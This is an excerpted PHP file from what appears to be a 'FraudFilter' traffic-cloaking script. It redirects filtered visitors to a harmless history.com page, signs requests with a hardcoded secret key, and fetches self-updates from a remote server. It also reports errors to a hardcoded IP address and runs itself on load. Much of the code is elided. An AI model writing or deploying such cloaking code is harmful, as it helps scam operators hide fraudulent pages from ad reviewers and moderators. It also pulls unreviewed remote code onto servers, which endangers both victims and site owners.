...
class FraudFilterDetector_k5gpd {
    ...
    function isSignatureValid($sign, $time) {
        $str = '42bcada9-bba6-4ae1-9cad-205ff6473589.'.$this->getClid().'.'.$time;
        $sha = sha1($str);
        return $sign === $sha;
    }
...
<?php
    ...
    function safeAction() {
        $this->redirect('https://www.history.com/topics/great-depression');
    }
    ...
    function getUpgradeScriptViaContents($home, $fileName) {
        $opts = array('http' =>
            array(
                'method'  => 'GET',
                'header' => 'x-ff-secret: 42bcada9-bba6-4ae1-9cad-205ff6473589',
                'timeout' => 2
            )
        );
    ...
    function upgradeScript($home, $fileName) {
        ...
        if ($output === false || !$this->isSignature2Valid($output)) {
            ...
            $headers[] = 'x-ff-secret: 42bcada9-bba6-4ae1-9cad-205ff6473589';
...
";
    ...
    function fillAllPostHeaders() {
        ...
        $headers[] = 'X-FF-P: 42bcada9-bba6-4ae1-9cad-205ff6473589';
    ...
    function notifyAboutError($message) {
        ...
        $url = 'http://139.59.212.55/ff-notify.html?v=ff1&guid=k5gpd&m='.$message;
        $ch = curl_init($url);
...
$fraudFilterDetector_k5gpd = new FraudFilterDetector_k5gpd();
$fraudFilterDetector_k5gpd->check();
